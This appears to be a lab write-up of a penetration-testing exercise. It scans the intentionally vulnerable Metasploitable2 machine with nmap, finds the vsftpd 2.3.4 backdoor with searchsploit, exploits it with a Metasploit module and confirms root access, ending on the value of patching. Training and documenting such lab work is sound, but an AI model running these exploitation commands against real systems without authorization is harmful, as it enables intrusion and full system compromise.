# Task 1 – Advanced Vulnerability Exploitation

## Objective
To identify vulnerable services on a target system and exploit them to gain
unauthorized access using Metasploit.

## Target Details
- Target System: Metasploitable2
- Target IP: 192.168.56.102
- Attacker System: Kali Linux

## Tools Used
- Nmap
- Metasploit Framework
- Searchsploit

## Steps Performed

### Step 1: Network Enumeration
A full port and service scan was performed to identify running services.

Command used:
nmap -sS -sV -O -p- 192.168.56.102

Multiple vulnerable services were identified, including FTP (vsftpd 2.3.4).

### Step 2: Vulnerability Identification
Searchsploit was used to identify known exploits for detected services.

Command used:
searchsploit vsftpd

The vsftpd 2.3.4 backdoor vulnerability was identified.

### Step 3: Exploitation
The vulnerability was exploited using Metasploit.

Commands used:
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.102
run

### Step 4: Verification
Root-level access was confirmed using standard Linux commands.

Commands used:
whoami
id
uname -a

## Result
A successful exploitation resulted in root shell access, confirming a complete
system compromise.

## Conclusion
The presence of outdated and vulnerable services allowed attackers to gain full
control of the target system. This highlights the importance of regular patching
and service hardening.
